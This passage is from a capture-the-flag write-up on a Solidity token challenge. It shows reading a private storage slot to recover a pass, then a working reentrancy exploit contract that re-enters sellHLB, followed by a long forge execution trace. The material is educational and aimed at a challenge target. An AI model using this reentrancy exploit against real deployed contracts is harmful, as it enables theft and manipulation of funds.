</span></span><span class=line><span class=cl>   <span class=n>seniority</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=n>lastWithdrawTime</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=s>&#34;Pas d&#39;argent pour les impatients !&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>allowance</span><span class=p>(</span><span class=kt>address</span> <span class=n>owner</span><span class=p>,</span> <span class=kt>address</span> <span class=n>delegate</span><span class=p>)</span> <span class=k>public</span> <span class=k>override</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=n>allowed</span><span class=p>[</span><span class=n>owner</span><span class=p>][</span><span class=n>delegate</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>transferFrom</span><span class=p>(</span><span class=kt>address</span> <span class=n>owner</span><span class=p>,</span> <span class=kt>address</span> <span class=n>buyer</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>numTokens</span><span class=p>)</span> <span class=k>public</span> <span class=k>override</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nb>require</span><span class=p>(</span><span class=n>numTokens</span> <span class=o>&lt;=</span> <span class=n>balances</span><span class=p>[</span><span class=n>owner</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>   <span class=nb>require</span><span class=p>(</span><span class=n>numTokens</span> <span class=o>&lt;=</span> <span class=n>allowed</span><span class=p>[</span><span class=n>owner</span><span class=p>][</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=n>owner</span><span class=p>]</span> <span class=o>=</span> <span class=n>balances</span><span class=p>[</span><span class=n>owner</span><span class=p>].</span><span class=n>sub</span><span class=p>(</span><span class=n>numTokens</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>allowed</span><span class=p>[</span><span class=n>owner</span><span class=p>][</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=n>allowed</span><span class=p>[</span><span class=n>owner</span><span class=p>][</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>].</span><span class=n>sub</span><span class=p>(</span><span class=n>numTokens</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=n>buyer</span><span class=p>]</span> <span class=o>=</span> <span class=n>balances</span><span class=p>[</span><span class=n>buyer</span><span class=p>].</span><span class=n>add</span><span class=p>(</span><span class=n>numTokens</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>emit</span> <span class=n>Transfer</span><span class=p>(</span><span class=n>owner</span><span class=p>,</span> <span class=n>buyer</span><span class=p>,</span> <span class=n>numTokens</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// senior function to get the vip pass.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kd>function</span> <span class=nf>senior</span><span class=p>()</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nb>require</span><span class=p>(</span><span class=n>seniority</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&gt;=</span> <span class=mi>10</span> <span class=o>*</span> <span class=mi>365</span> <span class=kc>days</span><span class=p>,</span> <span class=s>&#34;Revenez dans quelque temps.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=nb>require</span><span class=p>(</span><span class=n>seniority</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&lt;</span> <span class=mi>150</span> <span class=o>*</span> <span class=mi>365</span> <span class=kc>days</span><span class=p>,</span> <span class=s>&#34;Vous vous faites vieux, laissez-nous la place.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=n>vipPass</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fallback</span> <span class=p>()</span> <span class=k>external</span> <span class=k>payable</span>  <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nb>revert</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>modifier</span> <span class=nf>onlyOwner</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>boss</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// SafeMath to avoid integer underflow or overflow
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>library</span> <span class=n>SafeMath</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>sub</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>a</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>b</span><span class=p>)</span> <span class=k>internal</span> <span class=k>pure</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=nb>assert</span><span class=p>(</span><span class=n>b</span> <span class=o>&lt;=</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl> <span class=k>return</span> <span class=n>a</span> <span class=o>-</span> <span class=n>b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>add</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>a</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>b</span><span class=p>)</span> <span class=k>internal</span> <span class=k>pure</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=kt>uint256</span> <span class=n>c</span> <span class=o>=</span> <span class=n>a</span> <span class=o>+</span> <span class=n>b</span><span class=p>;</span>
</span></span><span class=line><span class=cl> <span class=nb>assert</span><span class=p>(</span><span class=n>c</span> <span class=o>&gt;=</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl> <span class=k>return</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Comment has been added on the function that will be exploited.</p><h2 id=exploitation>Exploitation</h2><h3 id=vippass>VipPass</h3><p>By seeing this contract, the goal was pretty clear. We want to get the vip pass. One thing that should never be forgotten in solidity:</p><blockquote><p>Nothing is private in smart contracts!</p></blockquote><p>The public variable can be accessed easly with call instruction. In other hand, the private variable can be accessed only with the function rpc function <code>eth_getStorageAt</code> (the name may be different depending of the client). The slot storage are explains in depth in <a href=https://docs.soliditylang.org/en/v0.8.7/internals/layout_in_storage.html target=_blank rel="noopener noreffer">soliditylang</a>.</p><p>Basically, compare to other types, uint256 is easy to understand. Its position slot is the position of the declared variable (note that the mapping does not count). In our case <code>uint256 private vipPass;</code> is at position <strong>4</strong>, the variable <code>boss</code> (the owner of the contract) is at position <strong>5</strong>.</p><p>To access the variable <code>vipPass</code>, we will use cast from the foundry binaries:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=c1># cast storage &lt;contract address&gt; &lt;slot number&gt;</span>
</span></span><span class=line><span class=cl>$ cast storage 0xD5c0873f147cECF336fEEF1a28474716C745Df86 <span class=m>4</span>
</span></span><span class=line><span class=cl>0x54be6df4fa514940682be41f9a5a04ecc45bb46877adcd1fa4db82c08d1bd080
</span></span></code></pre></td></tr></table></div></div><p>The function <code>senior()</code> returns the vipPass as an <code>uint256</code> value. The <code>cast storage</code> command returns the value as a hexadecimal string. We can either use an <a href=https://www.rapidtables.com/convert/number/hex-to-decimal.html target=_blank rel="noopener noreffer">online converter</a> or solidity (with foundry dependencies).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>13</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;forge-std/Test.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>ContractTest</span> <span class=k>is</span> <span class=n>Test</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>convert</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=c1>//address test = address(0x9A5a04eCC45BB46877ADcd1Fa4dB82C08D1bd080);
</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=c1>//uint256 test2 = uint256(uint160(test));
</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=kt>uint256</span> <span class=n>test3</span> <span class=o>=</span> <span class=mh>0x54be6df4fa514940682be41f9a5a04ecc45bb46877adcd1fa4db82c08d1bd080</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=n>emit</span> <span class=n>log_named_uint</span><span class=p>(</span><span class=s>&#34;test2: &#34;</span><span class=p>,</span> <span class=n>test3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>This contract can be executed with the <code>forge</code> command:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ forge run test/Converter.t.sol --fork-url http://127.0.0.1:8545 --sig <span class=s2>&#34;convert()&#34;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>⠒<span class=o>]</span> Compiling...
</span></span><span class=line><span class=cl><span class=o>[</span>⠆<span class=o>]</span> Compiling <span class=m>6</span> files with 0.8.13
</span></span><span class=line><span class=cl><span class=o>[</span>⠰<span class=o>]</span> Solc 0.8.13 finished in 2.05s
</span></span><span class=line><span class=cl>Compiler run successful
</span></span><span class=line><span class=cl>Script ran successfully.
</span></span><span class=line><span class=cl>Gas used: <span class=nv>2108</span>
</span></span><span class=line><span class=cl><span class=o>==</span> <span class=nv>Return</span> <span class=o>==</span>
</span></span><span class=line><span class=cl><span class=o>==</span> <span class=nv>Logs</span> <span class=o>==</span>
</span></span><span class=line><span class=cl>  test2: : <span class=m>38330739118242568697380065849010598905319469511070891991863930858741423657088</span>
</span></span></code></pre></td></tr></table></div></div><p>Unfortunately, the vipPass is not the only thing that is required, we need to have an address that is VIP:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc challenge.404ctf.fr <span class=m>30885</span>
</span></span><span class=line><span class=cl>Si vous êtes un membre, appuyez sur entrée. Si vous êtes un VIP, rentrez votre pass :
</span></span><span class=line><span class=cl><span class=m>38330739118242568697380065849010598905319469511070891991863930858741423657088</span>
</span></span><span class=line><span class=cl>Nous allons maintenant vérifier que vous êtes bien un vip.
</span></span><span class=line><span class=cl>Veuillez rentrer l<span class=err>&#39;</span>adresse ethereum avec laquelle vous êtes vip :
</span></span></code></pre></td></tr></table></div></div><h3 id=pwning-the-contract>Pwning the contract</h3><p>To get VIP we have to pass two requires: <code>require(seniority[msg.sender] >= 10 * 365 days, "Revenez dans quelque temps.");</code> and <code>require(seniority[msg.sender] &lt; 150 * 365 days, "Vous vous faites vieux, laissez-nous la place.");</code>.</p><p>The only function that update the seniroity mapping is <code>function sellHLB(uint256 numTokens)</code>. This function can only be called once a year and if we have already some HLB tokens. Before updating the <code>lastWithdrawTime</code> variable to restrict the call to that function, the fallback to our contract is called, which can call the <code>sellHLB(uint256 numTokens)</code> function. In other words, we can call the function <code>sellHLB(uint256 numTokens)</code> multiple times before the <code>lastWithdrawTime</code> function is updated, this is a reentrency attack!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>13</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;ds-test/test.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;forge-std/Test.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>interface</span> <span class=nc>IHallebardeToken</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>sellHLB</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>numTokens</span><span class=p>)</span> <span class=k>external</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>seniorityOf</span><span class=p>(</span><span class=kt>address</span> <span class=n>tokenOwner</span><span class=p>)</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>balanceOf</span><span class=p>(</span><span class=kt>address</span> <span class=n>tokenOwner</span><span class=p>)</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>buyHLB</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>senior</span><span class=p>()</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>TokenTest</span> <span class=k>is</span> <span class=n>Test</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>IHallebardeToken</span> <span class=n>ht</span> <span class=o>=</span>
</span></span><span class=line><span class=cl>   <span class=n>IHallebardeToken</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=mh>0xD5c0873f147cECF336fEEF1a28474716C745Df86</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>()</span> <span class=k>payable</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>pwn</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ht</span><span class=p>.</span><span class=n>buyHLB</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span> <span class=mi>12</span><span class=p>}();</span>
</span></span><span class=line><span class=cl>        <span class=n>ht</span><span class=p>.</span><span class=n>sellHLB</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>ht</span><span class=p>.</span><span class=n>senior</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>receive</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>emit</span> <span class=n>log_named_uint</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;seniority&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>ht</span><span class=p>.</span><span class=n>seniorityOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>))</span> <span class=o>/</span> <span class=mi>365</span> <span class=kc>days</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>i</span> <span class=o>&lt;=</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>ht</span><span class=p>.</span><span class=n>sellHLB</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Running the above script with forge:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>forge run test/token.t.sol --fork-url http://127.0.0.1:8545 --sig <span class=s2>&#34;pwn()&#34;</span> -vvvv
</span></span></code></pre></td></tr></table></div></div><p>returns the following output:</p><div class=table-wrapper><pre><b>[</b><font color=#4E9A06><b>⠒</b></font><b>]</b> Compiling...    
<b>[</b><font color=#4E9A06><b>⠢</b></font><b>]</b> Compiling 6 files with 0.8.13    
<b>[</b><font color=#4E9A06><b>⠰</b></font><b>]</b> Solc 0.8.13 finished in 2.02s  
Compiler run successful
Traces:   
  [278997] <font color=#4E9A06>TokenTest</font>::<font color=#4E9A06>pwn</font>()    
    ├─ [28455] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>dbd6bdcb</font>{value: 12}()   
    │   └─ <font color=#4E9A06>← </font>()
    ├─ [234688] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>d16bb868</font>(0000000000000000000000000000000000000000000000000000000000000001)    
    │   ├─  emit topic 0: <font color=#06989A>0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</font>
    │   │  topic 1: <font color=#06989A>0x000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84</font> 
    │   │  topic 2: <font color=#06989A>0x000000000000000000000000d5c0873f147cecf336feef1a28474716c745df86</font> 
    │   │ data: <font color=#06989A>0x0000000000000000000000000000000000000000000000000000000000000001</font>
    │   ├─ [198085] <font color=#4E9A06>TokenTest</font>::<font color=#4E9A06>fallback</font>{value: 1}()  
    │   │   ├─ [908] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>3b26d8d2</font>(000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84) <font color=#C4A000>[staticcall]</font>  
    │   │   │   └─ <font color=#4E9A06>← </font>0x0000000000000000000000000000000000000000000000000000000001e13380 
    │   │   ├─ emit <font color=#06989A>log_named_uint</font>(key: &quot;seniority&quot;, val: 1)   
    │   │   ├─ [171914] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>d16bb868</font>(0000000000000000000000000000000000000000000000000000000000000001)  
    │   │   │   ├─  emit topic 0: <font color=#06989A>0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</font>   
    │   │   │   │  topic 1: <font color=#06989A>0x000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84</font>    
    │   │   │   │  topic 2: <font color=#06989A>0x000000000000000000000000d5c0873f147cecf336feef1a28474716c745df86</font>  
    │   │   │   │ data: <font color=#06989A>0x0000000000000000000000000000000000000000000000000000000000000001</font> 
    │   │   │   ├─ [159211] <font color=#4E9A06>TokenTest</font>::<font color=#4E9A06>fallback</font>{value: 1}()  
    │   │   │   │   ├─ [908] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>3b26d8d2</font>(000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84) <font color=#C4A000>[staticcall]</font>  
    │   │   │   │   │   └─ <font color=#4E9A06>← </font>0x0000000000000000000000000000000000000000000000000000000003c26700 
    │   │   │   │   ├─ emit <font color=#06989A>log_named_uint</font>(key: &quot;seniority&quot;, val: 2)   
    │   │   │   │   ├─ [154940] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>d16bb868</font>(0000000000000000000000000000000000000000000000000000000000000001)  
    │   │   │   │   │   ├─  emit topic 0: <font color=#06989A>0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</font>   
    │   │   │   │   │   │  topic 1: <font color=#06989A>0x000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84</font>    
    │   │   │   │   │   │  topic 2: <font color=#06989A>0x000000000000000000000000d5c0873f147cecf336feef1a28474716c745df86</font>    
    │   │   │   │   │   │ data: <font color=#06989A>0x0000000000000000000000000000000000000000000000000000000000000001</font>    
    │   │   │   │   │   ├─ [142237] <font color=#4E9A06>TokenTest</font>::<font color=#4E9A06>fallback</font>{value: 1}()
    │   │   │   │   │   │   ├─ [908] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>3b26d8d2</font>(000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84) <font color=#C4A000>[staticcall]</font>
    │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>0x0000000000000000000000000000000000000000000000000000000005a39a80  
    │   │   │   │   │   │   ├─ emit <font color=#06989A>log_named_uint</font>(key: &quot;seniority&quot;, val: 3) 
    │   │   │   │   │   │   ├─ [137966] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>d16bb868</font>(0000000000000000000000000000000000000000000000000000000000000001)
    │   │   │   │   │   │   │   ├─  emit topic 0: <font color=#06989A>0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</font>    
    │   │   │   │   │   │   │   │  topic 1: <font color=#06989A>0x000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84</font>
    │   │   │   │   │   │   │   │  topic 2: <font color=#06989A>0x000000000000000000000000d5c0873f147cecf336feef1a28474716c745df86</font>
    │   │   │   │   │   │   │   │ data: <font color=#06989A>0x0000000000000000000000000000000000000000000000000000000000000001</font>    
    │   │   │   │   │   │   │   ├─ [125263] <font color=#4E9A06>TokenTest</font>::<font color=#4E9A06>fallback</font>{value: 1}()
    │   │   │   │   │   │   │   │   ├─ [908] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>3b26d8d2</font>(000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84) <font color=#C4A000>[staticcall]</font>  
    │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>0x000000000000000000000000000000000000000000000000000000000784ce00    
    │   │   │   │   │   │   │   │   ├─ emit <font color=#06989A>log_named_uint</font>(key: &quot;seniority&quot;, val: 4) 
    │   │   │   │   │   │   │   │   ├─ [120992] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>d16bb868</font>(0000000000000000000000000000000000000000000000000000000000000001)  
    │   │   │   │   │   │   │   │   │   ├─  emit topic 0: <font color=#06989A>0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</font>   
    │   │   │   │   │   │   │   │   │   │  topic 1: <font color=#06989A>0x000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84</font>    
    │   │   │   │   │   │   │   │   │   │  topic 2: <font color=#06989A>0x000000000000000000000000d5c0873f147cecf336feef1a28474716c745df86</font>    
    │   │   │   │   │   │   │   │   │   │ data: <font color=#06989A>0x0000000000000000000000000000000000000000000000000000000000000001</font>   
    │   │   │   │   │   │   │   │   │   ├─ [108289] <font color=#4E9A06>TokenTest</font>::<font color=#4E9A06>fallback</font>{value: 1}()    
    │   │   │   │   │   │   │   │   │   │   ├─ [908] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>3b26d8d2</font>(000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84) <font color=#C4A000>[staticcall]</font>    
    │   │   │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>0x0000000000000000000000000000000000000000000000000000000009660180   
    │   │   │   │   │   │   │   │   │   │   ├─ emit <font color=#06989A>log_named_uint</font>(key: &quot;seniority&quot;, val: 5)
    │   │   │   │   │   │   │   │   │   │   ├─ [104018] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>d16bb868</font>(0000000000000000000000000000000000000000000000000000000000000001)
    │   │   │   │   │   │   │   │   │   │   │   ├─  emit topic 0: <font color=#06989A>0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</font> 
    │   │   │   │   │   │   │   │   │   │   │   │  topic 1: <font color=#06989A>0x000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84</font>  
    │   │   │   │   │   │   │   │   │   │   │   │  topic 2: <font color=#06989A>0x000000000000000000000000d5c0873f147cecf336feef1a28474716c745df86</font>  
    │   │   │   │   │   │   │   │   │   │   │   │ data: <font color=#06989A>0x0000000000000000000000000000000000000000000000000000000000000001</font> 
    │   │   │   │   │   │   │   │   │   │   │   ├─ [91315] <font color=#4E9A06>TokenTest</font>::<font color=#4E9A06>fallback</font>{value: 1}()   
    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [908] <font color=#4E9A06>0xd5c0…df86</font>::<font color=#4E9A06>3b26d8d2</font>(000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84) <font color=#C4A000>[staticcall]</font>  
    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ <font color=#4E9A06>← </font>0x000000000000000000000000000000000000000000000000000000000b473500 
